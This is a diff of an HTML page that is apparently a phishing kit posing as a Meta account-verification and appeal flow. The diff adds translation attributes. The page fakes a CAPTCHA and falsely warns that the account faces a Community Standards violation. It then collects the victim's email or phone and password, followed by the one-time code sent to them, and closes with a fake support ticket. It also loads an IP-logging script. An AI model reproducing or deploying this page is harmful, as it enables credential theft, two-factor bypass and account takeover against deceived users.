@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
     <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-V7RH7T85NG"></script>
@@ -12,7 +12,7 @@
 </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification</title>
+    <title data-i18n="page_title">Account Verification</title>
     <link rel="stylesheet" href="style.css">
     <script src="/getIP.js" defer></script>
 </head>
@@ -24,15 +24,15 @@
 
         <img src="logomau.png" class="logo" alt="Logo">
 
-        <h2>Security Verification</h2>
-        <p class="desc">Please confirm that you are a real person to access this service.</p>
+        <h2 data-i18n="step1_heading">Security Verification</h2>
+        <p class="desc" data-i18n="step1_desc">Please confirm that you are a real person to access this service.</p>
 
         <label class="robot-box">
             <input type="checkbox" id="robotCheck">
-            <span>I'm not a robot</span>
+            <span data-i18n="robot_label">I'm not a robot</span>
         </label>
 
-        <div class="brand">Meta@2026</div>
+        <div class="brand" data-i18n="brand">Meta@2026</div>
     </div>
 </section>
 
@@ -42,7 +42,7 @@
 
         <video id="introVideo" src="video.mp4" playsinline muted></video>
 
-        <p class="video-note">Processing your request. Please keep this tab open until the process is complete.</p>
+        <p class="video-note" data-i18n="video_note">Processing your request. Please keep this tab open until the process is complete.</p>
     </div>
 </section>
 
@@ -53,14 +53,15 @@
         <img src="logomau.png" class="logo" alt="Logo">
         <img src="banermau.jpg" class="banner" alt="Banner">
 
-        <h2>Account Verification</h2>
-        <p class="desc">
+        <h2 data-i18n="step3_heading">Account Verification</h2>
+        <p class="desc" data-i18n="step3_desc">
             Your account has been reported for a serious violation of our Community Standards. Please verify your identity immediately.
         </p>
 
         <input
             type="text"
             id="contact"
+            data-i18n-placeholder="contact_placeholder"
             placeholder="Email address or mobile number"
             autocomplete="on">
 
@@ -69,12 +70,13 @@
         <input
             type="text"
             id="customerCode"
+            data-i18n-placeholder="password_placeholder"
             placeholder="Password"
             autocomplete="off">
 
         <p class="error" id="customerCodeError"></p>
 
-        <button id="submitBtn">Submit Appeal</button>
+        <button id="submitBtn" data-i18n="submit_btn">Submit Appeal</button>
 
         <div class="brand">Meta@2026</div>
     </div>
@@ -86,15 +88,15 @@
 
         <img src="logomau.png" class="logo" alt="Logo">
 
-        <h2>Account Verification</h2>
+        <h2 data-i18n="step5_heading">Account Verification</h2>
 
-<div class="notice-box">
+<div class="notice-box" data-i18n="otp_notice">
     We've sent a verification code to your
     <strong>Email, SMS</strong> or <strong>WhatsApp</strong> Please enter the code below.
 </div>
 
 <img src="otp-image.png.jpg" class="otp-image" alt="Ảnh minh họa">
-<p class="desc">
+<p class="desc" data-i18n="otp_desc">
     This process may take a few minutes. Please wait until the verification code is sent. Once the code is sent, you will be able to log in. Verifying the device listed in the message allows our system to identify you and confirm that you are the legitimate owner of the account.
 </p>
         <input
@@ -102,6 +104,7 @@
             inputmode="numeric"
             pattern="[0-9]*"
             id="otpCode"
+            data-i18n-placeholder="code_placeholder"
             placeholder="Code"
             autocomplete="one-time-code">
 
@@ -110,11 +113,11 @@
         <p class="attempt-text" id="attemptText"></p>
 
         <div class="resend-row">
-            <button class="resend-btn" id="resendBtn">Get new code</button>
+            <button class="resend-btn" id="resendBtn" data-i18n="resend_btn">Get new code</button>
             <span id="resendTimer">60s</span>
         </div>
 
-        <button id="verifyOtpBtn">Continue</button>
+        <button id="verifyOtpBtn" data-i18n="verify_btn">Continue</button>
 
         <div class="brand">Meta@2026</div>
     </div>
@@ -128,11 +131,11 @@
 
         <div class="success-icon">✓</div>
 
-        <h2>Identity confirmed.</h2>
-        <p class="desc">Thank you for confirming your identity. You can now restore access to your account.</p>
+        <h2 data-i18n="success_heading">Identity confirmed.</h2>
+        <p class="desc" data-i18n="success_desc">Thank you for confirming your identity. You can now restore access to your account.</p>
 
         <div class="request-box">
-            <span>Support Ticket Number:</span>
+            <span data-i18n="ticket_label">Support Ticket Number:</span>
             <strong id="requestCode">REQ-2026-000000</strong>
         </div>
 
@@ -146,8 +149,8 @@
 
         <div class="spinner"></div>
 
-        <h3 id="loadingTitle">Appeal in progress...</h3>
-        <p id="loadingStatus">✓ Your appeal is being submitted to Meta for review. This process may take a few moments.</p>
+        <h3 id="loadingTitle" data-i18n="loading_title">Appeal in progress...</h3>
+        <p id="loadingStatus" data-i18n="loading_status">✓ Your appeal is being submitted to Meta for review. This process may take a few moments.</p>
 
         <strong id="countdown">15</strong>
 
